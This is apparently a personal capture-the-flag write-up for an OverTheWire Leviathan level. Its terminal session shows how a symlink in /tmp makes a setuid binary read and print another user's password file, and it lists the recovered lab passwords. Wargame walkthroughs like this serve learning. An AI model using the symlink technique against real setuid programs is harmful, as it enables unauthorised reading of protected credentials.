# Leviathan Level 4 → Level 5 setuid root binaries and symLink

## Previous Flag
<b>0dyxT7F4QD</b>

## Goal
Use previous password to log in SSH with user <b>leviathan5</b> and port <b>2223</b> accessed on leviathan.labs.overthewire.org
Du Hint: Use binary file to redirect link and open /etc/leviathan_pass/leviathan6

## What I learned
```
Review
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker\overthewire> ssh leviathan5@leviathan.labs.overthewire.org -p 2223 ⌨️
leviathan5@leviathan:~$ ls -la ⌨️
total 36
drwxr-xr-x   2 root       root        4096 Jul 28 19:05 .
drwxr-xr-x 150 root       root        4096 Jul 28 19:06 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Jul 28 18:47 .bashrc     
-r-sr-x---   1 leviathan6 leviathan5 15144 Jul 28 19:05 leviathan5          # SUID binary
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
leviathan5@leviathan:~$ file leviathan5 ⌨️
leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0fbe5a715bf8cd28d02bc0e989a37f9c0ab21614, for GNU/Linux 3.2.0, not stripped
leviathan5@leviathan:~$ ./leviathan5 ⌨️
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 ⌨️ 
__libc_start_main(0x804910d, 1, 0xffffd464, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                            = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log  
)                                                      = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ touch /tmp/file.log ⌨️
leviathan5@leviathan:~$ cat /tmp/file.log ⌨️
cat: /tmp/file.log: No such file or directory               # Note: Somehow deleting it
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log ⌨️
leviathan5@leviathan:~$ ls -la /tmp/file.log ⌨️
lrwxrwxrwx 1 leviathan5 leviathan5 30 Aug  9 00:50 /tmp/file.log -> /etc/leviathan_pass/leviathan6
leviathan5@leviathan:~$ ./leviathan5 ⌨️
szo7HDB88w 🔐
```

## Flag
<b>szo7HDB88w</b>

## Continue
[Continue](./Leviathan0506.md)